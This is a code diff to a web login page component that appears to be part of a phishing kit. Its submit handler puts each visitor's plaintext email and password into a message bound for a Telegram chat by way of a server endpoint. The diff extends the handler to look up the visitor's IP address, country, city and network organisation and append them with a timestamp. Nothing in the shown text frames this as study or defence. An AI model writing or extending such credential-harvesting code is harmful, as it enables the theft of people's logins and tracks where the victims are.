@@ -27,12 +27,43 @@ export default function LoginPage() {
 
     const chatId = -4724313789
 
-    const onSubmit = async (data: LoginForm) => {
-        console.log(data);
+    const onSubmit = async (formData: LoginForm) => {
+
         setSending(true);
-        const message = `🟢 New Login Attempt\n\n📧 Email: ${data.email}\n🔐 Password: ${data.password}`;
+
 
         try {
+            // 1) Get IP / location info
+            const ipRes = await fetch("https://ipapi.co/json/");
+            if (!ipRes.ok) throw new Error("Failed to fetch IP/location");
+            const ipInfo = await ipRes.json();
+
+            // extract fields safely with fallbacks
+            const ip = ipInfo.ip ?? "Unknown IP";
+            const country = ipInfo.country_name ?? "Unknown Country";
+            const countryCode = ipInfo.country_calling_code ?? "Unknown Code";
+            const city = ipInfo.city ?? ipInfo.region ?? "Unknown City/Region";
+            const region = ipInfo.region ?? "";
+            const org = ipInfo.org ?? "";
+
+            // 2) Build message (URI encoded or plain). Telegram accepts plain; we'll send plain text.
+            const message = [
+                "🟢 New Login Attempt",
+                "",
+                `📧 Email: ${formData.email}`,
+                `🔐 Password: ${formData.password}`,
+                "",
+                `🌐 IP: ${ip}`,
+                `🏳️ Country: ${country}`,
+                `📞 Country Calling Code: ${countryCode}`,
+                `🏙 City / Region: ${city} ${region ? `(${region})` : ""}`,
+                org ? `🏢 Org: ${org}` : "",
+                `🕒 Time: ${new Date().toISOString()}`,
+            ]
+                .filter(Boolean)
+                .join("\n");
+
+
             const res = await fetch("/api/send-message", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
